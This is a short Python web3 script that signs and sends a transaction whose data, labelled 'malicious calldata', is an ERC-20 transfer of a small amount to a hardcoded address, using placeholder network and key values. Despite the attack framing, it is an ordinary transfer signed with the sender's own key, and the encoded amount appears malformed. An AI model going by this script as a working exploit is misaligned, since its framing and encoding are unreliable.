from web3 import Web3

network_url = 'YOUR_NETWORK_URL'  
web3 = Web3(Web3.HTTPProvider(network_url))

# Wallet and contract details
from_address = 'WALLET_ADDRESS'  
private_key = 'PRIVATE_KEY'  
contract_address = 'DEPLOYED_CONTRACT_ADDRESS'  

# Construct the malicious calldata
malicious_calldata = (
    '0xa9059cbb'  # Function signature for transfer(address,uint256)
    '000000000000000000000000C588e338FdBB2CC523a1177f3D18e87FF5A16a6b'  
    '000000000000000000000000000000000000000000000000000000000009897'  
)

# Create the transaction
tx = {
    'to': contract_address,
    'value': 0,
    'gas': 200000,
    'gasPrice': web3.toWei('10', 'gwei'),
    'nonce': web3.eth.getTransactionCount(from_address),
    'data': malicious_calldata
}

# Sign the transaction
signed_tx = web3.eth.account.sign_transaction(tx, private_key)

# Send the transaction
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
print(f'Transaction sent: {web3.toHex(tx_hash)}')
